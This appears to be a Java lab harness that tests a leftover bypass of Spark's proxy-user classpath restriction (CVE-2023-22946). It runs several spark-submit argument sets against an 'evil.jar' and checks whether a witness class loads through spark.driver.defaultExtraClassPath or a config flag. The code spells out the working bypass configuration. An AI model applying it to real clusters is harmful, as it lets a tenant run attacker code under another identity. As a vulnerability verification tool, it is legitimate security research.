package lab;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.StringJoiner;

/**
 * Prove the CVE-2023-22946 leftover: SPARK-41958 childClasspath.clear() still
 * runs, but spark.driver.defaultExtraClassPath is already on the spark-submit -cp.
 */
public final class LabMain {

  static final String WITNESS = "SPARK-PROXYUSER-CLASSPATH-WITNESS";
  static final Path EVIL_JAR = Path.of("/opt/lab/evil.jar");
  static final Path APP_JAR = Path.of("/opt/lab/app.jar");
  static final Path ORACLE = Path.of("/work/oracle");
  static final Path WITNESS_FILE = ORACLE.resolve(WITNESS);
  static final Path RESULT_FILE = ORACLE.resolve("result.txt");

  public static void main(String[] args) throws Exception {
    Files.createDirectories(ORACLE);
    Files.deleteIfExists(WITNESS_FILE);
    String javaBin = Path.of(System.getProperty("java.home"), "bin", "java").toString();
    List<String> lines = new ArrayList<>();

    Walk control =
        runWalk(
            "control_jars_cleared",
            javaBin,
            ORACLE.resolve("control.txt"),
            List.of(
                "--proxy-user",
                "tenant",
                "--master",
                "yarn",
                "--deploy-mode",
                "cluster",
                "--jars",
                EVIL_JAR.toString(),
                APP_JAR.toString()));
    lines.add(control.summary());

    Walk closedExtra =
        runWalk(
            "closed_extra_classpath",
            javaBin,
            ORACLE.resolve("closed-extra.txt"),
            List.of(
                "--proxy-user",
                "tenant",
                "--master",
                "yarn",
                "--deploy-mode",
                "cluster",
                "--conf",
                "spark.driver.extraClassPath=" + EVIL_JAR,
                "--jars",
                EVIL_JAR.toString(),
                APP_JAR.toString()));
    lines.add(closedExtra.summary());

    Walk leftoverDefault =
        runWalk(
            "leftover_default_extra",
            javaBin,
            WITNESS_FILE,
            List.of(
                "--proxy-user",
                "tenant",
                "--master",
                "yarn",
                "--deploy-mode",
                "cluster",
                "--conf",
                "spark.driver.defaultExtraClassPath=" + EVIL_JAR,
                "--jars",
                EVIL_JAR.toString(),
                APP_JAR.toString()));
    lines.add(leftoverDefault.summary());

    Walk leftoverFlag =
        runWalk(
            "leftover_flag_flip",
            javaBin,
            ORACLE.resolve("flag-flip.txt"),
            List.of(
                "--proxy-user",
                "tenant",
                "--master",
                "yarn",
                "--deploy-mode",
                "cluster",
                "--conf",
                SparkSubmit.ALLOW_CUSTOM_CLASSPATH_BY_PROXY_USER_IN_CLUSTER_MODE + "=true",
                "--jars",
                EVIL_JAR.toString(),
                APP_JAR.toString()));
    lines.add(leftoverFlag.summary());

    boolean defaultLanded = leftoverDefault.submitCpHasEvil && leftoverDefault.loadedFromSubmitCp;
    boolean flagLanded = leftoverFlag.childHasEvil && leftoverFlag.loadedFromChildCp;
    boolean gateHeldOnDefault = leftoverDefault.childCleared && !leftoverDefault.childHasEvil;
    boolean extraOmitted = !closedExtra.submitCpHasEvil && !closedExtra.loadedFromSubmitCp;
    boolean controlHeld = control.childCleared && !control.submitCpHasEvil && !control.loadedFromSubmitCp;

    lines.add("default_landed=" + defaultLanded);
    lines.add("flag_landed=" + flagLanded);
    lines.add("gate_held_on_default=" + gateHeldOnDefault);
    lines.add("extra_classpath_omitted=" + extraOmitted);
    lines.add("control_held=" + controlHeld);
    lines.add("witness_file=" + Files.isRegularFile(WITNESS_FILE));

    String body = String.join("\n", lines) + "\n";
    Files.writeString(RESULT_FILE, body, StandardCharsets.UTF_8);
    System.out.print(body);
    if (!defaultLanded && !flagLanded) {
      throw new IllegalStateException("attacker classes did not land on constructed -cp");
    }
    if (!Files.isRegularFile(WITNESS_FILE)
        || !Files.readString(WITNESS_FILE, StandardCharsets.UTF_8).contains(WITNESS)) {
      throw new IllegalStateException("witness file missing");
    }
  }

  private static Walk runWalk(String name, String javaBin, Path out, List<String> argv)
      throws Exception {
    SparkSubmitCommandBuilder.ParsedSubmit parsed = SparkSubmitCommandBuilder.parse(argv);
    boolean client =
        SparkSubmitCommandBuilder.isClientMode(parsed.master(), parsed.deployMode(), parsed.conf());
    String extra = SparkSubmitCommandBuilder.sparkSubmitExtraClassPath(client, parsed.conf());
    List<String> submitCp = SparkSubmitCommandBuilder.buildClassPath(extra);
    List<String> child =
        SparkSubmit.prepareChildClasspath(
            parsed.conf(),
            parsed.proxyUser(),
            parsed.master(),
            parsed.deployMode(),
            parsed.primaryResource(),
            parsed.jars());
    boolean disallowed =
        SparkSubmit.isCustomClasspathInClusterModeDisallowed(
            parsed.conf(), parsed.proxyUser(), parsed.master(), parsed.deployMode());
    boolean submitHasEvil = containsPath(submitCp, EVIL_JAR);
    boolean childHasEvil = containsPath(child, EVIL_JAR);
    Load submitLoad = loadWitness(javaBin, submitCp, out.resolveSibling(name + "-submit.txt"));
    Load childLoad = loadWitness(javaBin, child, out.resolveSibling(name + "-child.txt"));
    if (submitLoad.ok() || childLoad.ok()) {
      Path winner = submitLoad.ok() ? submitLoad.out() : childLoad.out();
      Files.createDirectories(out.getParent());
      Files.writeString(out, Files.readString(winner, StandardCharsets.UTF_8), StandardCharsets.UTF_8);
    }
    return new Walk(
        name,
        client,
        extra == null ? "" : extra,
        submitCp,
        child,
        disallowed,
        child.isEmpty() && disallowed,
        submitHasEvil,
        childHasEvil,
        submitLoad.ok(),
        childLoad.ok());
  }

  private static boolean containsPath(List<String> cp, Path jar) {
    String want = jar.toAbsolutePath().normalize().toString();
    for (String entry : cp) {
      if (Path.of(entry).toAbsolutePath().normalize().toString().equals(want)) {
        return true;
      }
    }
    return false;
  }

  private static Load loadWitness(String javaBin, List<String> cp, Path out) throws Exception {
    Files.deleteIfExists(out);
    if (cp.isEmpty()) {
      return new Load(out, 1, "empty-cp", false);
    }
    List<String> cmd = new ArrayList<>();
    cmd.add(javaBin);
    cmd.add("-cp");
    cmd.add(String.join(java.io.File.pathSeparator, cp));
    cmd.add("lab.WitnessMain");
    cmd.add(out.toString());
    ProcessBuilder builder = new ProcessBuilder(cmd);
    builder.redirectErrorStream(true);
    Process process = builder.start();
    String log = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    int rc = process.waitFor();
    boolean ok =
        rc == 0
            && Files.isRegularFile(out)
            && Files.readString(out, StandardCharsets.UTF_8).contains(WITNESS);
    return new Load(out, rc, log.trim(), ok);
  }

  private record Load(Path out, int rc, String log, boolean ok) {}

  private record Walk(
      String name,
      boolean clientMode,
      String extraClassPath,
      List<String> submitCp,
      List<String> childCp,
      boolean disallowed,
      boolean childCleared,
      boolean submitCpHasEvil,
      boolean childHasEvil,
      boolean loadedFromSubmitCp,
      boolean loadedFromChildCp) {

    String summary() {
      StringJoiner joiner = new StringJoiner(" ");
      joiner.add("walk=" + name);
      joiner.add("client=" + clientMode);
      joiner.add("disallowed=" + disallowed);
      joiner.add("child_cleared=" + childCleared);
      joiner.add("submit_cp_has_evil=" + submitCpHasEvil);
      joiner.add("child_has_evil=" + childHasEvil);
      joiner.add("loaded_submit_cp=" + loadedFromSubmitCp);
      joiner.add("loaded_child_cp=" + loadedFromChildCp);
      joiner.add("extra=" + extraClassPath);
      joiner.add("submit_cp=" + String.join(",", submitCp));
      joiner.add("child_cp=" + String.join(",", childCp));
      return joiner.toString();
    }
  }
}
